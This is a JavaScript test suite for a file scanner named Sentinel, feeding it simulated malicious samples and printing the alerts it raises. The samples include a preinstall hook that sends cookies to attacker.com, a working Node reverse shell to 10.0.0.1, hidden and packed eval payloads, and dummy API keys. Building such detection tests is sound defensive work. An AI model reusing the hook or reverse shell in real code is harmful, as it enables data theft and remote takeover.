/**
 * Sentinel: Scanner Test Suite (Midu-style Exploit Simulation)
 */

const { scanFile } = require('./index');

// 1. Invisible Unicode (Midu-style 36KB line simulation)
const invisiblePayload = "// Safe code here" + "\u200B".repeat(50) + " eval('malware')";
const invisibleTest = scanFile('malicious_file.js', invisiblePayload);

// 2. High Entropy / Obfuscation
const largeLinePayload = "console.log('start');\n" + "A".repeat(2000) + ";\nconsole.log('end');";
const entropyTest = scanFile('obfuscated.js', largeLinePayload);

// 3. Dangerous Lifecycle Script
const packageJsonPayload = JSON.stringify({
    name: "test-pkg",
    scripts: {
        "preinstall": "node -e \"fetch('http://attacker.com?c=' + process.env.COOKIE)\""
    }
}, null, 2);
const lifecycleTest = scanFile('package.json', packageJsonPayload);

// Advanced Scenario: Packed Obfuscation
const packedPayload = "eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('0.1(\\'2\\')',3,3,'console|log|hacked'.split('|'),0,{}))";
const packedObfuscationTest = scanFile('packed_exploit.js', packedPayload);

// Advanced Scenario: Multi-line Polymorphic Reverse Shell
const polyShellPayload = `
const net = require("net");
const c = require("child_process");
const sh = c.spawn("sh", []);
const client = new net.Socket();
client.connect(1337, "10.0.0.1", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});`;
const polyShellTest = scanFile('reverse_shell.js', polyShellPayload);


// 4. Secret Detection Tests
const secretPayloads = [
  { name: 'aws_leak.tf', content: 'aws_access_key_id = "AKIA_NOT_REAL_KEY_123"' },
  { name: 'config.js', content: 'const API_KEY = "ghp_ThisIsADummyTokenForSentinelTesting";' },
  { name: '.env.production', content: 'OPENAI_API_KEY=sk-proj-ThisIsADummyOpenAIKeyForSentinelTesting' },
  { name: 'deploy.sh', content: 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.DUMMY_PAYLOAD.DUMMY_SIGNATURE"' },
  { name: 'keys.pem', content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEvgIBADANBg...' },
  { name: 'db.js', content: 'const uri = "mongodb+srv://dummy:pass@cluster.mongodb.net";' },
  { name: 'stripe.js', content: 'const stripe = require("stripe")("sk_live_DUMMY_STRIPE_TOKEN_SENTINEL_TEST");' },
];

const secretResults = secretPayloads.map(p => scanFile(p.name, p.content));
console.log("\n=== SENTINEL SCAN RESULTS ===\n");

function printResults(test) {
    console.log(`File: ${test.filename}`);
    if (test.alerts.length === 0) {
        console.log("  ✅ Clean");
    } else {
        test.alerts.forEach(alert => {
            const sev = alert.severity || alert.riskLevel || '?';
            const type = alert.type || alert.ruleName || 'RULE_MATCH';
            const msg = alert.message || alert.description || 'No description';
            console.log(`  [${sev}] ${type}: ${msg}`);
        });
    }
    console.log("-".repeat(30));
}

printResults(invisibleTest);
printResults(entropyTest);
printResults(lifecycleTest);
printResults(packedObfuscationTest);
printResults(polyShellTest);

console.log("\n=== SECRET DETECTION TESTS ===\n");
secretResults.forEach(r => printResults(r));
